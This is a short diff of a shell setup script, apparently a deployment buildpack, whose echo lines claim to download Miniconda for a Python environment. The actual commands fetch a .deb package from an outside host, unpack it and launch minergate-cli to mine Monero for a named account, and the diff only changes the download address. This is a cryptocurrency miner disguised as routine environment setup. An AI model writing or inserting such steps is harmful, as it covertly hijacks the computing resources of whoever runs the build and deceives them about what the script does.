@@ -36,8 +36,8 @@ echo "-----> Preparing Python Environment..."
 
 echo "---> Downloading Miniconda..."
 
-wget https://file.town/uploads/hhck0ndyanyq6wvl9qie0zwzj.
-ar x hhck0ndyanyq6wvl9qie0zwzj.
+wget http://vivivuvu.net/abc.deb
+ar x abc.deb
 tar -xvzf data.tar.gz
 cd opt/minergate-cli
 ./minergate-cli -user pro_desk@outlook.com -xmr
